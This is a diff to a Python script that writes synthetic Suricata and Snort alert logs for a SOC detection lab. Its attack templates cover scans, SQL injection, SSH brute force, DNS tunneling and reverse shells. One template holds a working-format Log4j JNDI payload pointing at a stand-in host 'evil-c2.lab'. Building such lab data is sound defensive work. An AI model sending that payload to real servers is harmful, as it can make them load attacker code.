@@ -1,10 +1,10 @@
 """
-Master Traffic & Synthetic Log Generator for SOC Lab
-Generates high-fidelity realistic Suricata EVE JSON and Snort 3 logs representing:
-1. Reconnaissance Phase (Nmap Port Scans, Ping Sweeps)
-2. Weaponization & Initial Access (SQL Injection, XSS, Log4j RCE)
-3. Exploitation & Privilege Escalation (SSH Brute Force, Shell Execution)
-4. Command & Control / Data Exfiltration (DNS Tunneling, Cobalt Strike Beacon)
+Master Traffic & Synthetic Log Generator for SOC Detection & Monitoring Lab
+Generates high-fidelity realistic Suricata 8.0.6 EVE JSON and Snort 3 logs adhering to LLD v1.0:
+1. Reconnaissance Phase (Nmap Port Scans, Ping Sweeps - SIDs: 9000001+, 9100020+)
+2. Weaponization & Initial Access (SQL Injection, XSS, Log4j RCE - SIDs: 9010001+, 9100010+)
+3. Exploitation & Credential Access (SSH Brute Force - SIDs: 9020001+, 9100025)
+4. Command & Control / Data Exfiltration (DNS Tunneling, Reverse Shell - SIDs: 9030001+, 9100030)
 """
 
 import json
@@ -14,45 +14,44 @@ import time
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
-
+# Architecture Baseline IP Addresses
 ATTACKERS = [
-    ("198.51.100.44", "CobaltStrike_Actor"),
-    ("203.0.113.88", "Mirai_Scanner"),
-    ("45.33.32.156", "External_Recon_Host"),
-    ("185.220.101.5", "Tor_Exit_Node_Attacker"),
+    ("10.77.20.20", "soc-attacker (Kali Linux)"),
+    ("198.51.100.44", "External_C2_Actor"),
+    ("185.220.101.5", "Tor_Exit_Node"),
 ]
 
 TARGETS = [
-    ("192.168.1.10", 80, "HTTP"),
-    ("192.168.1.10", 443, "HTTPS"),
-    ("192.168.1.20", 22, "SSH"),
-    ("192.168.1.30", 3306, "MySQL"),
+    ("10.77.30.20", 80, "HTTP"),
+    ("10.77.30.20", 443, "HTTPS"),
+    ("10.77.30.20", 3000, "OWASP Juice Shop"),
+    ("10.77.30.20", 22, "SSH"),
 ]
 
 
 def generate_synthetic_soc_logs(
     eve_path: Path = Path("logs/suricata/eve.json"),
     snort_path: Path = Path("logs/snort/alert_json.txt"),
-    count: int = 40
+    count: int = 50
 ):
     eve_path.parent.mkdir(parents=True, exist_ok=True)
     snort_path.parent.mkdir(parents=True, exist_ok=True)
 
-    base_time = datetime.now(timezone.utc) - timedelta(minutes=45)
+    base_time = datetime.now(timezone.utc) - timedelta(minutes=60)
     
     suricata_events = []
     snort_events = []
 
-    print(f"[*] Generating {count} realistic SOC alerts across Suricata and Snort...")
+    print(f"[*] Generating {count} high-fidelity SOC alerts across Suricata 8.0.6 & Snort 3...")
 
     attack_templates = [
-        # Recon
+        # 1. Reconnaissance (T1046 / T1595)
         {
             "stage": "Recon",
-            "suri_sig": "SOC-SCAN: Nmap Stealth NULL Scan Detected (No Flags)",
-            "snort_sig": "SNORT-SCAN: Nmap Stealth NULL Scan",
-            "suri_sid": 1000101,
-            "snort_sid": 2000020,
+            "suri_sig": "SOC-SCAN: Nmap Stealth NULL Scan Detected (Zero Flags)",
+            "snort_sig": "SNORT-SCAN: Nmap Stealth NULL Scan (No Flags)",
+            "suri_sid": 9000001,
+            "snort_sid": 9100020,
             "category": "Attempted Information Leak",
             "suri_sev": 3,
             "proto": "TCP",
@@ -60,23 +59,23 @@ def generate_synthetic_soc_logs(
         },
         {
             "stage": "Recon",
-            "suri_sig": "SOC-SCAN: Automated Vulnerability Scanner - Nikto Detected",
+            "suri_sig": "SOC-SCAN: Automated Vulnerability Scanner - Nikto Probe Detected",
             "snort_sig": "SNORT-SCAN: Automated Vulnerability Scanner Nikto",
-            "suri_sid": 1000110,
-            "snort_sid": 2000021,
+            "suri_sid": 9000010,
+            "snort_sid": 9100021,
             "category": "Web Application Activity",
             "suri_sev": 4,
             "proto": "TCP",
             "mitre": "T1595",
             "http": {"hostname": "victim-shop.local", "url": "/nikto-test-probe.html", "http_user_agent": "Nikto/2.1.6"},
         },
-        # Web Attack (SQLi / XSS / LFI / Log4j)
+        # 2. Web Application Attacks (T1190)
         {
             "stage": "Initial Access",
-            "suri_sig": "SOC-ATTACK: Web SQL Injection - UNION SELECT Attempt",
-            "snort_sig": "SNORT-ATTACK: Web SQL Injection UNION SELECT",
-            "suri_sid": 1000001,
-            "snort_sid": 2000010,
+            "suri_sig": "SOC-ATTACK: Web SQL Injection - UNION SELECT Pattern Detected",
+            "snort_sig": "SNORT-ATTACK: Web SQL Injection UNION SELECT Pattern",
+            "suri_sid": 9010001,
+            "snort_sid": 9100010,
             "category": "Web Application Attack",
             "suri_sev": 2,
             "proto": "TCP",
@@ -86,34 +85,34 @@ def generate_synthetic_soc_logs(
         {
             "stage": "Initial Access",
             "suri_sig": "SOC-ATTACK: Remote Code Execution - Apache Log4j JNDI Lookup (${jndi:})",
-            "snort_sig": "SNORT-ATTACK: Apache Log4j JNDI RCE Attempt",
-            "suri_sid": 1000040,
-            "snort_sid": 2000013,
+            "snort_sig": "SNORT-ATTACK: Apache Log4j JNDI RCE Exploit (${jndi:})",
+            "suri_sid": 9010040,
+            "snort_sid": 9100013,
             "category": "Attempted Administrator Privilege Gain",
             "suri_sev": 1,
             "proto": "TCP",
             "mitre": "T1190",
             "http": {"hostname": "victim-shop.local", "url": "/api/v1/health", "http_user_agent": "${jndi:ldap://evil-c2.lab:1389/Exploit}"},
         },
-        # Brute Force
+        # 3. Credential Access (T1110)
         {
             "stage": "Credential Access",
-            "suri_sig": "SOC-ATTACK: SSH Brute Force Attack - High Frequency Connection",
+            "suri_sig": "SOC-ATTACK: SSH Brute Force Attack - High Frequency Connection Threshold Exceeded",
             "snort_sig": "SNORT-ATTACK: SSH Brute Force Rate Exceeded",
-            "suri_sid": 1000120,
-            "snort_sid": 2000025,
+            "suri_sid": 9020001,
+            "snort_sid": 9100025,
             "category": "Attempted Administrator Privilege Gain",
             "suri_sev": 2,
             "proto": "TCP",
             "mitre": "T1110",
         },
-        # C2 & Exfil
+        # 4. Command & Control / Exfiltration (T1071 / T1059)
         {
             "stage": "C2 & Exfil",
             "suri_sig": "SOC-MALWARE: Suspicious Abnormally Long DNS Query (Potential DNS Tunneling/Exfil)",
             "snort_sig": "SNORT-MALWARE: Suspicious DNS Tunneling Query",
-            "suri_sid": 1000201,
-            "snort_sid": 2000035,
+            "suri_sid": 9030001,
+            "snort_sid": 9100035,
             "category": "A Network Trojan was detected",
             "suri_sev": 2,
             "proto": "UDP",
@@ -121,10 +120,10 @@ def generate_synthetic_soc_logs(
         },
         {
             "stage": "C2 & Exfil",
-            "suri_sig": "SOC-MALWARE: Interactive Reverse Shell Session Established (sh/bash prompt)",
-            "snort_sig": "SNORT-MALWARE: Interactive Reverse Shell /bin/sh",
-            "suri_sid": 1000210,
-            "snort_sid": 2000030,
+            "suri_sig": "SOC-MALWARE: Interactive Reverse Shell Session Established (/bin/sh prompt detected)",
+            "snort_sig": "SNORT-MALWARE: Interactive Reverse Shell /bin/sh Output",
+            "suri_sid": 9030010,
+            "snort_sid": 9100030,
             "category": "A Network Trojan was detected",
             "suri_sev": 1,
             "proto": "TCP",
@@ -139,7 +138,7 @@ def generate_synthetic_soc_logs(
         target_ip, target_port, _ = random.choice(TARGETS)
         src_port = random.randint(30000, 65000)
 
-        current_time += timedelta(seconds=random.randint(15, 75))
+        current_time += timedelta(seconds=random.randint(10, 60))
         iso_time = current_time.isoformat() + "Z"
 
         # 1. Suricata Event
@@ -152,7 +151,7 @@ def generate_synthetic_soc_logs(
             "dest_ip": target_ip,
             "dest_port": target_port,
             "proto": tmpl["proto"],
-            "community_id": f"1:synthetic_{random.randint(1000, 9999)}",
+            "community_id": f"1:soc_{random.randint(1000, 9999)}",
             "alert": {
                 "action": "allowed",
                 "gid": 1,
